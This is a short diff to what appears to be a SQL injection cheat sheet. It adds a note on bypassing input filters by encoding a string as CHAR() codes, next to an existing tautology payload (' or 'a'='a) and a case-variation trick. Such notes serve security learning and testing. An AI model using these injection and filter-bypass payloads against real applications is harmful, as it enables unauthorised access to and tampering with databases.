@@ -47,6 +47,11 @@ you can inject:
 ‘ or ‘a’=’a
 
 
+filter bypasses:
+use ASCII codes
+example request: select ename, sal from emp where ename=’marcus’
+ASCII encoding : SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
+
 For example, if the SELECT
 keyword is being blocked or removed, you can try the following bypasses:
 SeLeCt
